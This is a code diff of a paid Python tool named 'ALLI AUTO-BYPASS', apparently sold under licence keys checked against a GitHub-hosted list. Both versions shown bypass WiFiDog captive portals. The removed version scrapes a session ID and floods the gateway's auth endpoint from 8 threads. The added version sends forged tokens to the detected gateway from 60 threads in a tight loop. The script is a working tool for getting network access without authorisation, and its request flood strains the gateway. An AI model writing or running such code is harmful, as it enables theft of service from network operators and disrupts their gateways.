@@ -1,236 +1,143 @@
-import requests
-import re
-import urllib3
-import time
+  import requests
 import threading
-import logging
-import random
-import datetime
-import os
+import time
+import sys
 import hashlib
-from urllib.parse import urlparse, parse_qs, urljoin
+import subprocess
+import os
+import urllib3
+from datetime import datetime
 
+# Warning များ ပိတ်ထားခြင်း
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ===============================
-# 🌐 ONLINE CONFIG (GitHub Database)
-# ===============================
-KEY_URL = "https://raw.githubusercontent.com/Zyan091/my-database/main/key.txt"
+# ==========================================
+# SERVER CONFIG
+# ==========================================
+GIST_RAW_URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/key.txt"
+KEY_FILE = ".alli_key.txt" 
 
-# ===============================
-# CONFIG & USER INFO
-# ===============================
-EXPIRY_DATE = "LOADING..." 
-USER_ID = "LOADING..."
-PING_THREADS = 8 
-MIN_INTERVAL = 0.02
-MAX_INTERVAL = 0.1
-DEBUG = False
+# COLORS
+R, G, Y, B, M, C, W = "\033[31m", "\033[32m", "\033[33m", "\033[34m", "\033[35m", "\033[36m", "\033[37m"
+BOLD, RESET = "\033[1m", "\033[0m"
 
-# ===============================
-# COLOR SYSTEM
-# ===============================
-RED = "\033[91m"
-GREEN = "\033[92m"
-CYAN = "\033[96m"
-YELLOW = "\033[93m"
-MAGENTA = "\033[95m"
-WHITE = "\033[97m"
-RESET = "\033[0m"
-
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s | %(message)s",
-    datefmt="%H:%M:%S"
-)
-
-stop_event = threading.Event()
-USER_DATA = {"id": "", "key": "", "exp": ""}
-
-# ===============================
-# UNIQUE DEVICE ID GENERATOR (FIXED ERROR)
-# ===============================
-def get_device_id():
-    # ဖုန်းထဲမှာ ID မြဲနေအောင် ဖိုင်တစ်ခုနဲ့ သိမ်းထားတဲ့ စနစ်
-    id_file = os.path.join(os.path.expanduser("~"), ".alli_device_id.txt")
-    
-    if os.path.exists(id_file):
-        with open(id_file, "r") as f:
-            return f.read().strip()
-    else:
-        try:
-            # error ဖြစ်စေတဲ့ .node အစား [1] (nodename) ကို သုံးထားပါတယ်
-            node_name = os.uname()[1]
-        except:
-            node_name = "ALLI-USER"
-            
-        # ID မရှိသေးရင် random အသစ်ထုတ်ပြီး ဖိုင်ထဲသိမ်းမယ်
-        raw_str = str(time.time()) + node_name + str(random.random())
-        new_id = hashlib.md5(raw_str.encode()).hexdigest()[:10].upper()
-        with open(id_file, "w") as f:
-            f.write(new_id)
-        return new_id
-
-def check_real_internet():
+def get_hwid():
     try:
-        return requests.get("http://www.google.com", timeout=3).status_code == 200
+        model = subprocess.check_output("getprop ro.product.model", shell=True).decode().strip()
+        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
+        raw_id = f"{model}{serial}ALLI-AUTO-v4"
+        return hashlib.sha256(raw_id.encode()).hexdigest()[:14].upper()
     except:
-        return False
+        return "ALLI-DEVICE-ERR"
 
-# ===============================
-# LOGIN & REGISTRATION SYSTEM
-# ===============================
-def login():
-    dev_id = get_device_id()
-    os.system('clear')
-    print(f"{CYAN}="*45)
-    print(f"{MAGENTA}    ALLI DEVICE REGISTRATION SYSTEM")
-    print(f"{CYAN}="*45)
-    print(f"{WHITE}[*] Your Device ID: {YELLOW}{dev_id}")
-    print(f"{WHITE}[*] Status: {RED}CHECKING ACCESS...")
-    print(f"{CYAN}="*45)
-    
+def verify_license(user_key, current_hwid):
     try:
-        response = requests.get(KEY_URL + "?v=" + str(random.random()), timeout=10)
-        lines = response.text.strip().split('\n')
+        response = requests.get(f"{GIST_RAW_URL}?nocache={time.time()}", timeout=20, verify=False)
+        if response.status_code != 200: return {"v": False, "m": "DATABASE ERROR"}
+        keys_data = response.text.splitlines()
+        for line in keys_data:
+            if not line.strip() or "|" not in line: continue
+            k, stored_hwid, expiry_str, status = line.split('|')
+            if user_key == k:
+                expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
+                if datetime.now() > expiry_date: return {"v": False, "m": "LICENSE EXPIRED!"}
+                if status.lower() != "active": return {"v": False, "m": "KEY INACTIVE!"}
+                if stored_hwid == "None" or stored_hwid == current_hwid:
+                    time_left = expiry_date - datetime.now()
+                    return {"v": True, "m": f"{time_left.days}D LEFT", "p": (stored_hwid == "None")}
+                else:
+                    return {"v": False, "m": "HWID LOCKED!"}
     except:
-        print(f"\n{RED}[!] Error: Could not connect to Key Server.{RESET}")
-        exit()
+        return {"v": False, "m": "CONNECTION ERROR"}
+    return {"v": False, "m": "INVALID KEY"}
 
-    print(f"{WHITE}[!] Please send your ID to Admin for access.")
-    input_key = input(f"\n{CYAN}[🔑] ENTER ACCESS KEY: {RESET}").strip()
-    
-    found = False
-    for line in lines:
-        if '|' not in line: continue
-        data = line.strip().split('|')
+def get_portal_link():
+    """မည်သည့် IP ဖြစ်စေ အလိုအလျောက် ရှာဖွေပေးသော စနစ်"""
+    try:
+        # လက်ရှိ ချိတ်ထားသော WiFi ၏ Gateway IP ကို ရှာခြင်း
+        gw_cmd = "ip route show default | awk '{print $3}'"
+        gw = subprocess.check_output(gw_cmd, shell=True).decode().strip()
         
-        if len(data) >= 3:
-            db_id = data[0].strip()
-            db_key = data[1].strip()
-            db_exp = data[2].strip()
+        # IP ရှာမတွေ့ပါက Default 192.168.110.1 ကို သုံးမည်
+        if not gw or "." not in gw:
+            gw = "192.168.110.1"
+            
+        # Token နေရာတွင် Dynamic ID တစ်ခုကို ထည့်သွင်းပေးခြင်း
+        return f"http://{gw}:2060/wifidog/auth?token=ALLI_AUTO_{int(time.time())}"
+    except:
+        return "http://192.168.110.1:2060/wifidog/auth?token=ALLI_AUTO_FIX"
 
-            if dev_id == db_id and input_key == db_key:
-                USER_DATA['id'] = db_id
-                USER_DATA['key'] = db_key
-                USER_DATA['exp'] = db_exp
-                found = True
-                break
-
-    if found:
+def turbo_pulse(auth_link):
+    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8)'}
+    while True:
         try:
-            exp_time = datetime.datetime.strptime(USER_DATA['exp'], "%Y-%m-%d %H:%M")
-            if datetime.datetime.now() > exp_time:
-                print(f"\n{RED}[!] YOUR ACCESS HAS EXPIRED! ({USER_DATA['exp']}){RESET}")
-                exit()
-            
-            global EXPIRY_DATE, USER_ID
-            USER_ID = USER_DATA['id']
-            EXPIRY_DATE = USER_DATA['exp']
-            
-            print(f"\n{GREEN}[✓] LOGIN SUCCESSFUL! HELLO {USER_ID}{RESET}")
-            time.sleep(1.5)
-            return True
-        except:
-            print(f"\n{RED}[!] Date Format Error! Use: YYYY-MM-DD HH:MM{RESET}")
-            exit()
-    else:
-        print(f"\n{RED}[X] INVALID ID OR KEY! ACCESS DENIED.{RESET}")
-        print(f"{YELLOW}[!] Admin ကို ID ပို့ပြီး Key ဝယ်ယူပါ။{RESET}")
-        exit()
+            requests.get(auth_link, headers=headers, timeout=5, verify=False)
+        except: pass
+        time.sleep(0.001)
 
-# ===============================
-# ENHANCED HACKER BANNER
-# ===============================
+def rainbow_alli():
+    text = """
+    █████╗ ██╗     ██╗     ██╗
+    ██╔══██╗██║     ██║     ██║
+    ███████║██║     ██║     ██║
+    ██╔══██║██║     ██║     ██║
+    ██║  ██║███████╗███████╗██║
+    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝"""
+    colors = [R, G, Y, B, M, C]
+    for line in text.splitlines():
+        color = colors[int(time.time()*5) % len(colors)]
+        print(f"{color}{BOLD}{line}{RESET}")
+        time.sleep(0.01)
+
 def banner():
-    os.system('clear')
-    print(f"{CYAN}="*45)
-    print(f"{MAGENTA}    ▄▄▄· ▄▄▌  ▄▄▌  ▪  ▄▄▄▄·  ▄▄▄· .▄▄ · .▄▄ · ")
-    print(f"{MAGENTA}    ▐█ ▀█ ██•  ██•  ██ ▐█ ▀█▪▐█ ▀█ ▐█ ▀. ▐█ ▀. ")
-    print(f"{WHITE}    ▄█▀▀█ ██▪  ██▪  ▐█·▐█▀▀█▄▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄")
-    print(f"{WHITE}    ▐█ ▪▐▌▐█▌▐▌▐█▌▐▌▐█▌▐█▄▪▐█▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█")
-    print(f"{CYAN}    ▀  ▀ .▀▀▀ .▀▀▀ ▀▀▀··▀▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀▀ ")
-    print(f"{CYAN}="*45)
-    print(f"{YELLOW}  [+] OWNER   : ALLI")
-    print(f"{YELLOW}  [+] USER ID : {USER_ID}")
-    print(f"{RED}  [+] EXPIRY  : {EXPIRY_DATE}")
-    print(f"{GREEN}  [+] STATUS  : PREMIUM UNLOCKED")
-    print(f"{CYAN}="*45 + f"{RESET}")
+    subprocess.run("clear", shell=True)
+    rainbow_alli()
+    print(f"{C}╔══════════════════════════════════════════════╗")
+    print(f"║{W}   ALLI AUTO-BYPASS   |   STABLE v4.0        {C}║")
+    print(f"║{W}   Status: {G}VIP PREMIUM{W}  |   Ping: {G}Anti-Lag      {C}║")
+    print(f"╚══════════════════════════════════════════════╝{RESET}")
 
-def high_speed_ping(auth_link, sid):
-    session = requests.Session()
-    while not stop_event.is_set():
-        try:
-            session.get(auth_link, timeout=15)
-            print(f"{GREEN}[⚡] {RESET}USER: {USER_ID[:6]} | {CYAN}STATUS: BYPASSING...{RESET}    ", end="\r")
-        except:
-            print(f"{RED}[!] Reconnecting...{RESET}                ", end="\r")
-            time.sleep(1)
-        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
-
-def start_process():
-    if not login(): return
+def start():
     banner()
+    hwid = get_hwid()
+    print(f"{M}[-] YOUR DEVICE ID: {W}{BOLD}{hwid}{RESET}")
+
+    if os.path.exists(KEY_FILE):
+        with open(KEY_FILE, "r") as f: key = f.read().strip()
+        print(f"{G}[*] Auto-loading saved license...{RESET}")
+    else:
+        key = input(f"{C}[>] ENTER LICENSE: {RESET}").strip()
+
+    auth = verify_license(key, hwid)
+    if not auth["v"]:
+        if os.path.exists(KEY_FILE): os.remove(KEY_FILE)
+        print(f"{R}[X] {auth['m']}{RESET}"); sys.exit()
+
+    with open(KEY_FILE, "w") as f: f.write(key)
+    if auth.get("p"):
+        print(f"{R}[!] BIND THIS ID TO ALLI: {hwid}{RESET}"); sys.exit()
+
+    # Link မတောင်းတော့ဘဲ IP ရှာပြီး တန်းမောင်းပါမည်
+    final_link = get_portal_link()
     
-    logging.info(f"{CYAN}Starting Alli Turbo Engine...{RESET}")
+    subprocess.run("clear", shell=True)
+    banner()
+    print(f"\n{G}  [✓] ENGINE STARTED: {Y}{final_link}")
+    print(f"  [✓] ALL WARNINGS SUPPRESSED.")
+    print(f"  [✓] AUTO-GATEWAY DETECTION ACTIVE.{RESET}\n")
 
-    while not stop_event.is_set():
-        session = requests.Session()
-        test_url = "http://connectivitycheck.gstatic.com/generate_204"
-
-        try:
-            r = requests.get(test_url, allow_redirects=True, timeout=10)
-
-            if r.url == test_url:
-                if check_real_internet():
-                    print(f"{YELLOW}[•]{RESET} Internet Active. Monitoring...          ", end="\r")
-                    time.sleep(5)
-                    continue
-
-            portal_url = r.url
-            parsed_portal = urlparse(portal_url)
-            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
-
-            print(f"\n{GREEN}[+] Captive Portal Found!{RESET}")
-            print(f"{WHITE}[*] Host: {portal_host}{RESET}")
-
-            r1 = session.get(portal_url, verify=False, timeout=15)
-            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
-            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
-            r2 = session.get(next_url, verify=False, timeout=15)
-
-            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
-            if not sid:
-                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
-                sid = sid_match.group(1) if sid_match else None
-
-            if not sid:
-                logging.warning(f"{RED}Failed to capture SID. Retrying...{RESET}")
-                time.sleep(3)
-                continue
-
-            print(f"{GREEN}[✓] SID Captured: {sid}{RESET}")
-
-            params = parse_qs(parsed_portal.query)
-            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
-            gw_port = params.get('gw_port', ['2060'])[0]
-
-            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
-            print(f"{MAGENTA}[*] Injecting {PING_THREADS} High-Speed Threads...{RESET}")
-
-            for _ in range(PING_THREADS):
-                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
-
-            while check_real_internet():
-                time.sleep(5)
-
-        except Exception as e:
-            if DEBUG: logging.error(f"{RED}Error: {e}{RESET}")
-            time.sleep(2)
+    for _ in range(60):
+        threading.Thread(target=turbo_pulse, args=(final_link,), daemon=True).start()
+    
+    colors = [R, G, Y, B, M, C]
+    i = 0
+    while True:
+        print(f"\r{colors[i%6]}{BOLD} [⚡] ALLI PRO RUNNING... SPEED: MAX | PING: STABLE {RESET}", end="")
+        i += 1
+        time.sleep(0.2)
 
 if __name__ == "__main__":
     try:
-        start_process()
+        start()
     except KeyboardInterrupt:
-        stop_event.set()
-        print(f"\n{RED}[!] Alli Engine Shutdown...{RESET}")
+        sys.exit()     
